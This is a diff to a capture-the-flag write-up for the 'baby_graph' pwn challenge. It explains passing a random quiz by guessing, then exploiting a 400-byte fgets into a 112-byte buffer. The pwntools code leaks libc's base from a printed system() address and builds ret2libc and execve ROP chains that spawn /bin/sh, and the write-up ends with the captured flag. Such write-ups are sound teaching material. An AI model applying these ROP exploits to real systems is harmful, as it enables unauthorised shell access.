@@ -331,6 +331,74 @@ int main() {
 }
 ~~~
 
-It does not seem intially feasible to compute whether the tree is Eulerian simply by the number of edges and vertices, which is printed out to the console with each prompt.  However, this loop only executes `NQUIZ = 5` times.  Thus, brute forcing the answer will work one of every `2^5 = 32` times.  Furthermore, some fuzzing was performed to understand whether there is an implicit bias toward Y or N.  Results of thousands of iterations show that the graph is not Eulerian more than 3x more often.  This can be rationalized by understanding that `bruh` is set to false if *any* of the vertices has an even degree.  Since each graph is generated randomly with 2-10 vertices, there is logically a much better chance that the `bruh` is false.  
+It does not seem intially feasible to compute whether the tree is Eulerian simply by the number of edges and vertices, which is printed out to the console with each prompt.  However, this loop only executes `NQUIZ = 5` times.  Thus, brute forcing the answer will work one of every `2^5 = 32` times.  Furthermore, some fuzzing was performed to understand whether there is an implicit bias toward 'Y' or 'N'.  Results of thousands of iterations show that the correct answer is 'N'  more than 3x as often.  This can be rationalized by understanding that `bruh` is set to false if *any* of the vertices has an even degree.  Since each graph is generated randomly with 2-10 vertices and (V(V-1))/2 edges, there is logically a much better chance that the `bruh` variable is false.  
 
-After a few lucky guesses (`N-N-N-Y-N` seemed to be a lucky winning combination), `vuln()` was called.  Here the binary prompts for user input and retrieves it with `fgets()`.  While `fgets()` is a safer function than its vulnerable cousin `gets()`, the program has a clear overflow vulnerability by reading in 400 bytes into a 100 byte buffer.  Disassembly shows that the buffer is actually set to `0x70 = 112` bytes, but still clearly vulnerable to overflow.  
+After a few lucky guesses (`N-N-N-Y-N` seemed to be a lucky winning combination), `vuln()` was called.  Here the binary prints the address of `system()` and prompts for user input, retrieving it with `fgets()`.  While `fgets()` is a safer function than its vulnerable cousin `gets()`, the program has a clear overflow vulnerability by reading in 400 bytes into a 100 byte buffer.  Disassembly shows that the buffer is actually set to `0x70 = 112` bytes, but still clearly vulnerable to overflow.  This allows for RIP control and a rop chain that uses gadgets in both the binary and libc, since the address to `system` can be used to calculate libc's base address during execution.  A snippet from `baby_graph_solver.py` is included below showing the calculation.  
+
+~~~python
+# receive the system pointer from binary output
+p.recvuntil("prize: ")
+system_addr = p.recvline().strip()
+system_addr = int(system_addr, 16)
+# calculate libc base using pwntools
+libc = ELF('./libc.so.6')
+system_offset = libc.symbols['system']
+libc_base = system_addr - system_offset
+~~~ 
+
+The rationale for finding libc's base address is to locate the address of `/bin/sh` to get a shell, as `/bin/sh` does not exist in the binary itself.  The buffer can be overflowed precicely, or the chain case use a `ret` address to create a "ret sled" that will slide into the first ROP gadget.  Since there are plenty of `pop rdi` gadgets in libc that can pop `/bin/sh` into the register, the ROP chain should be as simple as: 
+
+~~~python
+r = ROP(libc)
+# /bin/sh string
+bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
+bin_sh_addr = bin_sh_offset + libc_base
+# pop rdi gadget
+pop_rdi_offset = r.find_gadget(['pop rdi', 'ret']).address
+pop_rdi_addr = pop_rdi_offset + libc_base
+# ret gadget
+ret_offset = r.find_gadget(['ret']).address
+ret_addr = ret_offset + libc_base
+chain = [
+    pop_rdi_addr,
+    bin_sh_addr,    # rdi
+    system_addr,    # system call
+]
+p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
+~~~
+
+Only, it's not?  The exploit, which works locally, continued to fail on the server.  Extensive debugging ensued which included a successful call to `puts` with `/bin/sh` popped into `rdi`.  Therefore the only conclusion which can be reached is that there was an error in the call to `system` on the server binary.  
+
+An alternative means of popping a shell was created; this time using `execve` in lieu of `system`.  With libc available, finding `pop rsi` and `pop rdx` gadgets was not difficult, though the provided libc's simplest `pop rdx` gadget also included a pop to `r12`.  Furthermore, some implementations require that `rsi` and `rdx` point to `NULL` as opposed to storing `NULL` directly in the register.  Taking this into account, the following rop chain was developed:
+
+~~~python
+# pop rsi gadget
+pop_rsi_offset = r.find_gadget(['pop rsi', 'ret']).address
+pop_rsi_addr = pop_rsi_offset + libc_base
+
+# pop rdx gadget
+pop_rdx_offset = r.find_gadget(['pop rdx', 'pop r12', 'ret']).address
+pop_rdx_addr = pop_rdx_offset + libc_base
+
+# execve gadget
+execve_offset = libc.symbols['execve']
+execve_addr = execve_offset + libc_base
+
+# null ptr (*VALID* pointer to 0)
+nullptr_offset = next(libc.search(p64(0)))
+nullptr_addr = nullptr_offset + libc_base
+
+chain = [
+    pop_rdi_addr,
+    bin_sh_addr,    # rdi
+    pop_rsi_addr,
+    nullptr_addr,              # rsi
+    pop_rdx_addr,
+    nullptr_addr,              # rdx
+    0,              # r12
+    execve_addr,
+]
+p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
+~~~
+
+A shell was successfully obtained with the new approach, and the flag `RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}` was captured!
